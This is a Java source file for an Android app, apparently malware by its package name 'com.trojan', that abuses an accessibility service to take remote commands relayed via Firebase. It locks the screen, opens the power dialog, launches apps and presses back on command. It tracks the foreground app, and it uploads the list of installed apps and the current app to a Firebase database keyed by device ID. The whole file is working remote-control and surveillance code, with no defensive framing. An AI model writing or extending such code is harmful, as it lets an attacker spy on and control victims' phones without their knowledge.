package com.trojan;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;

public class PowerAccessibilityService extends AccessibilityService {
    private static final String TAG = "PowerAccessibility";

    // --- Define all possible actions the service can perform ---
    public static final String ACTION_TRIGGER_LOCK_SCREEN = "com.trojan.LOCK_SCREEN";
    public static final String ACTION_TRIGGER_SHUTDOWN = "com.trojan.SHUTDOWN";
    public static final String ACTION_TRIGGER_LIST_APPS = "com.trojan.LIST_APPS";
    public static final String ACTION_TRIGGER_OPEN_APP = "com.trojan.OPEN_APP";
    public static final String ACTION_TRIGGER_CLOSE_APP = "com.trojan.CLOSE_APP"; // GLOBAL_ACTION_BACK
    public static final String ACTION_TRIGGER_GET_CURRENT_APP = "com.trojan.GET_CURRENT_APP";

    private String lastForegroundApp = "";

    // The receiver that listens for commands broadcasted by the Firebase service
    private final BroadcastReceiver commandReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent == null || intent.getAction() == null) {
                return;
            }

            String action = intent.getAction();
            Log.d(TAG, "Received command: " + action);

            switch (action) {
                case ACTION_TRIGGER_LOCK_SCREEN:
                    performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
                    break;
                case ACTION_TRIGGER_SHUTDOWN:
                    performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
                    break;
                case ACTION_TRIGGER_LIST_APPS:
                    listInstalledApps();
                    break;
                case ACTION_TRIGGER_OPEN_APP:
                    String packageNameToOpen = intent.getStringExtra("package_name");
                    if (packageNameToOpen != null) {
                        openApp(packageNameToOpen);
                    }
                    break;
                case ACTION_TRIGGER_CLOSE_APP:
                    // This simulates pressing the "Back" button, effectively closing the foreground app
                    performGlobalAction(GLOBAL_ACTION_BACK);
                    break;
                case ACTION_TRIGGER_GET_CURRENT_APP:
                    reportCurrentApp();
                    break;
            }
        }
    };

    // --- Core Logic Methods ---

    /**
     * Gathers all non-system installed apps and uploads them to Firebase Realtime Database.
     */
    private void listInstalledApps() {
        Log.d(TAG, "Listing installed applications...");
        PackageManager pm = getPackageManager();
        Map<String, String> appMap = new HashMap<>();
        for (ApplicationInfo app : pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
            // Filter out system apps to get a cleaner list
            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = pm.getApplicationLabel(app).toString();
                String packageName = app.packageName;
                appMap.put(packageName, appName);
            }
        }
        // Upload the map to the database
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        DatabaseReference dbRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("installed_apps");
        dbRef.setValue(appMap);
        Log.d(TAG, "App list uploaded to Firebase.");
    }

    /**
     * Launches an application using its package name.
     * @param packageName The package name of the app to open.
     */
    private void openApp(String packageName) {
        Log.d(TAG, "Attempting to open app: " + packageName);
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (launchIntent != null) {
            startActivity(launchIntent);
        } else {
            Log.w(TAG, "Could not get launch intent for package: " + packageName);
        }
    }

    /**
     * Reports the package name of the last known foreground app to Firebase.
     */
    private void reportCurrentApp() {
        Log.d(TAG, "Reporting current foreground app: " + lastForegroundApp);
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        DatabaseReference dbRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("current_app");
        dbRef.setValue(lastForegroundApp);
    }


    // --- Service Lifecycle Methods ---

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // We listen for window state changes to know which app is in the foreground
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null) {
                lastForegroundApp = event.getPackageName().toString();
            }
        }
    }

    @Override
    public void onInterrupt() {
        // Called when the service is interrupted
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Accessibility Service connected and ready.");
        // Register the receiver to listen for all our defined actions
        IntentFilter filter = new IntentFilter();
        filter.addAction(ACTION_TRIGGER_LOCK_SCREEN);
        filter.addAction(ACTION_TRIGGER_SHUTDOWN);
        filter.addAction(ACTION_TRIGGER_LIST_APPS);
        filter.addAction(ACTION_TRIGGER_OPEN_APP);
        filter.addAction(ACTION_TRIGGER_CLOSE_APP);
        filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
        registerReceiver(commandReceiver, filter, Context.RECEIVER_EXPORTED);
    }

    @Override
    public boolean onUnbind(Intent intent) {
        unregisterReceiver(commandReceiver);
        Log.d(TAG, "Accessibility Service disconnected.");
        return super.onUnbind(intent);
    }
}
